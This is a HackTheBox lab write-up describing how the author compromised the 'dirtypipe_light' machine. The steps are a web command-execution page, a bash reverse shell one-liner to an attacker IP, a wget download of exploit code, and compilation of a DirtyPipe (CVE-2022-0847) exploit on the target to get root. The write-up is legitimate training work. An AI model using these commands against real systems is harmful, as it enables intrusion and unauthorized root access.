## Reconnaissance

### nmap 

```
nmap -sC -sV -oN dirtypipe_light 10.129.136.81
```

![[./IMG/0.png]]
### WebSite 
- Access target site, it's a HTB custom page with command execute function.

![[./IMG/1.png]]

- Try to execute following command 
1. Confirm current user 
```
id
```

![[./IMG/2.png]]

2. Read passwd 
```
cat /etc/passwd
```

![[./IMG/3.png]]
## Exploit 

- Set up a reverse shell 
```
bash -c 'bash -i >& /dev/tcp/10.10.17.145/1337 0>&1'
```
![[./IMG/4.png]]

- Check nc status, get reverse shell

![[./IMG/5.png]]

- Check current user 
```
id
```

![[./IMG/6.png]]
- List Directory 

![[./IMG/7.png]]

- Execute linpeas (no image)
- It will get a lot of information and possible cve to escalate privilege  (no image)
- And I can find dirtypipe vulnerability in it. (no image)

## Privilege Escalation 
- Research the DirtyPipe's exploit code, find some exploit code in Github.
- Download all of them
- Compile it in local environment and upload it to target.

![[./IMG/8.png]]

- It won't be execute success 
```
./exploit-1
```
- Error message 
```
./exploit-1: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33` not found (required bu ./exploit-1)
./exploit-1: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34` not found (required bu ./exploit-1)
```

![[./IMG/9.png]]

- After research the error for a while, I think the root cause is the target environment missing correct GLIBC version 
- Check GLIBC in target environment with following command (no image)
```
strings /lib/x86_64-linux-gnu/libc.so.6 | grep GLIBC_
```
- The solution for it only 2: 
1. Compile it with low version GLIBC --> but it's very complicate to do it
   - I need to create a new environment which gcc and GLIBC is lower version

2. Upgrade target version's GLIBC --> more complicate, target environment can't connect to external network. 
- Fortunately, I found that it's able to execute gcc in target environment
- So I upload the c file to target and compile it in target environment
```
wget -m http://10.10.17.145:9191/dirtypiipeExp
```

![[./IMG/10.png]]

- Check the Exploit code directory

![[./IMG/11.png]]

- Add execute permission on shell script

![[./IMG/12.png]]

- Compile it in target machine 
```
./compile.sh
```

![[./IMG/13.png]]

- Then it success to execute. 
```
id
```

![[./IMG/14.png]]

- Get root flag

![[./IMG/15.png]]
## Reference 
### DirtyPipe Exploit 
#### Exploit Code - works
- [(GITHUB)CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)
#### Exploit Code - not work
- [Exploit code (in C)](https://haxx.in/files/dirtypipez.c)
- [(GITHUB)CVE-2022-0847](https://github.com/r1is/CVE-2022-0847)

#### Analysis 
- [Linux 内核提权 DirtyPipe（CVE-2022-0847）漏洞分析](https://www.anquanke.com/post/id/270067)
- [Day16 - DirtyPipe - 如果有一個分頁，你可以提權，你會不會想要用?](https://ithelp.ithome.com.tw/articles/10302016?sc=rss.qu)
- [The Dirty Pipe Vulnerability](https://dirtypipe.cm4all.com/)

### Reverse shell 
- [Reverse Shell Generator](https://www.revshells.com/)

### GLIBC Error 
- [How can I link to a specific glibc version?](https://stackoverflow.com/questions/2856438/how-can-i-link-to-a-specific-glibc-version)
- [ Version 'GLIBC_2.34' not found简单有效解决方法](https://blog.csdn.net/huazhang_001/article/details/128828999)

![[./IMG/16.png]]

- [(Need to Try it)(GITHUB)XenSpawn](https://github.com/X0RW3LL/XenSpawn)

> Other solution 

```
gcc -o file file.c -static
```



###### tags: `HackTheBox`